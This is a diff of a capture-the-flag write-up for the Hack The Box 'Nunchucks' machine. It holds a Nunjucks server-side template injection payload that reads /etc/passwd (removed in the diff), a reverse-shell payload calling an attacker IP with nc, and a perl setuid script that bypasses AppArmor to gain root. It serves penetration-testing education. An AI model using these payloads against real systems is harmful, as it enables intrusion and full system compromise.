@@ -103,6 +103,7 @@ On this webpage we have a single input field and if we test out an SSTI it takes
 
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks
 
+The following is the payload I used in burp suite after capturing the store.nunchucks.htb input button.
 
 ```
 POST /api/submit HTTP/1.1
@@ -126,39 +127,10 @@ Connection: close
 ```
 Now that we have finally confirmed that it is an SSTI we can form the rest of the payload. Hacktricks gave the basics of the command but in order for this payload to work I had to use \ to escape the "", otherwise the payload wouldnt work and URL encoding had no effect.
 
-```
-POST /api/submit HTTP/1.1
-Host: store.nunchucks.htb
-Cookie: _csrf=2Zc7PPzLntxukEPB3DAKztkS
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://store.nunchucks.htb/
-Content-Type: application/json
-Origin: https://store.nunchucks.htb
-Content-Length: 127
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-Connection: close
+Set up your listener and send the reverse shell payload.
 
-{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat  /etc/passwd')\")()}}"}
-```
+Note: Another version of this would be to send it commands and create your own SSH keys on the target to login. Since the SSH Port is open.
 
-```
-HTTP/1.1 200 OK
-Server: nginx/1.18.0 (Ubuntu)
-Date: Tue, 18 Oct 2022 21:50:58 GMT
-Content-Type: application/json; charset=utf-8
-Content-Length: 2550
-Connection: close
-X-Powered-By: Express
-ETag: W/"9f6-FbxVBWED1/U+Hb55hF5G8o+ReWw"
-
-{"response":"You will receive updates on the following email address: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndavid:x:1000:1000:david:/home/david:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\n."}
-```
 ```
 POST /api/submit HTTP/1.1
 Host: store.nunchucks.htb
@@ -179,6 +151,9 @@ Connection: close
 
 {"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.16 1234 >/tmp/f')\")()}}"}
 ```
+
+We get a shell, the flag, and upgrade to an interactive shell!
+
 ```console
 └─$ nc -lvnp 1234
 listening on [any] 1234 ...
@@ -194,6 +169,16 @@ david@nunchucks:~$ cat user.txt
 cat user.txt
 3c82****************************
 ```
+
+In my enumeration I found that perl was vulnerable from its capabilities with cap_setuid. However nothing I did was working.
+
+https://gtfobins.github.io/gtfobins/perl/
+
+
+
+
+
+It turns out that it had apparmor enabled as can be seen by this file. Basically we could run ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``` but it would not execute the shell. However changing the command to whoami or id showed that it was running as root.
 
 ```console
 david@nunchucks:/tmp$ cat /etc/apparmor.d/usr.bin.perl
@@ -222,8 +207,11 @@ cat /etc/apparmor.d/usr.bin.perl
 
 }
 ```
+With a quick google search I came to this page which gives the answer. By putting the exploit into a script we can bypass the apparmor and gain root.
 
 http://0xma.com/hacking/bypass_apparmor_with_perl_script.html
+
+Your script should look something like this.
 
 ```perl
 #!/usr/bin/perl
@@ -233,6 +221,7 @@ POSIX::setuid(0);
 
 exec "/bin/sh"
 ```
+After running it we can confirm our id is root and get the flag!
 
 ```console
 david@nunchucks:/tmp$ ./rogue.pl
@@ -245,3 +234,4 @@ cat /root/root.txt
 5a9*****************************
 # 
 ```
+Congrats!
